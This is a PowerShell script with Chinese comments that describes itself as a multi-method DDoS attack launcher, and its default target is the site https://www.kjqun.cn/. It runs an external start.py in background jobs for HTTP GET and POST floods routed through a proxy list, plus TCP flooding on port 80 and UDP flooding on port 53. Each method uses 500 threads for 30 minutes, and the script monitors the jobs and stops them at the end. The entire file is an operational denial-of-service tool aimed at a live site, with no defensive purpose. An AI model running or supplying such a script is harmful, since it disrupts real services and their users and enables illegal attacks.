# PowerShell专用DDoS攻击启动脚本
# 解决PowerShell中&符号不支持的问题

param(
    [string]$TargetUrl = "https://www.kjqun.cn/",
    [int]$ThreadsPerMethod = 500,
    [int]$Duration = 1800
)

function Start-DDoSAttack {
    param(
        [string]$AttackName,
        [string]$Command
    )
    
    Write-Host "🚀 启动$AttackName攻击..." -ForegroundColor Green
    Write-Host "📝 命令: $Command" -ForegroundColor Yellow
    
    try {
        # 使用Start-Job在后台运行
        $job = Start-Job -ScriptBlock {
            param($cmd)
            Invoke-Expression $cmd
        } -ArgumentList $Command
        
        Write-Host "✅ $AttackName攻击已启动 (作业ID: $($job.Id))" -ForegroundColor Green
        return $job
    }
    catch {
        Write-Host "❌ $AttackName攻击启动失败: $_" -ForegroundColor Red
        return $null
    }
}

function Monitor-Attacks {
    param(
        [array]$Jobs,
        [int]$Duration
    )
    
    $startTime = Get-Date
    $endTime = $startTime.AddSeconds($Duration)
    
    Write-Host "`n📊 开始监控攻击状态..." -ForegroundColor Cyan
    
    while ((Get-Date) -lt $endTime) {
        $elapsed = (Get-Date) - $startTime
        $remaining = $endTime - (Get-Date)
        
        $activeJobs = @($Jobs | Where-Object { $_.State -eq "Running" })
        
        Write-Host "⏰ 已运行: $($elapsed.ToString('mm\分ss\秒')) | 剩余: $($remaining.ToString('mm\分ss\秒')) | 活跃攻击: $($activeJobs.Count)/$($Jobs.Count)" -ForegroundColor Yellow
        
        # 每30秒报告一次
        Start-Sleep -Seconds 30
    }
    
    Write-Host "`n🛑 攻击时间结束，正在停止所有攻击..." -ForegroundColor Red
}

function Stop-AllAttacks {
    param([array]$Jobs)
    
    foreach ($job in $Jobs) {
        if ($job.State -eq "Running") {
            try {
                Stop-Job -Job $job
                Remove-Job -Job $job
                Write-Host "🛑 已停止作业ID: $($job.Id)" -ForegroundColor Yellow
            }
            catch {
                Write-Host "❌ 停止作业失败: $_" -ForegroundColor Red
            }
        }
    }
    
    Write-Host "✅ 所有攻击已停止" -ForegroundColor Green
}

# 主程序
Write-Host "="*60 -ForegroundColor Cyan
Write-Host "💥 PowerShell多重DDoS攻击启动器" -ForegroundColor Cyan
Write-Host "="*60 -ForegroundColor Cyan
Write-Host "🎯 目标: $TargetUrl" -ForegroundColor White
Write-Host "⚡ 每方法线程数: $ThreadsPerMethod" -ForegroundColor White
Write-Host "⏱️ 持续时间: $Duration秒 ($([math]::Floor($Duration/60))分钟)" -ForegroundColor White
Write-Host "-"*60 -ForegroundColor Cyan

$domain = $TargetUrl -replace "^https?://", "" -replace "/.*", ""

# 定义攻击方法
$attackMethods = @(
    @{
        Name = "GET方法(Layer7)"
        Command = "python start.py GET $TargetUrl 0 $ThreadsPerMethod proxies.txt $ThreadsPerMethod $Duration"
    },
    @{
        Name = "POST方法(Layer7)"
        Command = "python start.py POST $TargetUrl 0 $ThreadsPerMethod proxies.txt $ThreadsPerMethod $Duration"
    },
    @{
        Name = "TCP方法(Layer4)"
        Command = "python start.py TCP ${domain}:80 $ThreadsPerMethod $Duration"
    },
    @{
        Name = "UDP方法(Layer4)"
        Command = "python start.py UDP ${domain}:53 $ThreadsPerMethod $Duration"
    }
)

# 启动所有攻击
$jobs = @()

foreach ($attack in $attackMethods) {
    $job = Start-DDoSAttack -AttackName $attack.Name -Command $attack.Command
    if ($job) {
        $jobs += $job
    }
    Start-Sleep -Seconds 2
}

Write-Host "`n✅ 所有攻击方法已启动，总共 $($jobs.Count) 种攻击" -ForegroundColor Green
Write-Host "📊 总攻击线程数: $($ThreadsPerMethod * $jobs.Count)" -ForegroundColor Green

# 监控攻击
Monitor-Attacks -Jobs $jobs -Duration $Duration

# 停止攻击
Stop-AllAttacks -Jobs $jobs

Write-Host "`n🎯 攻击完成！" -ForegroundColor Cyan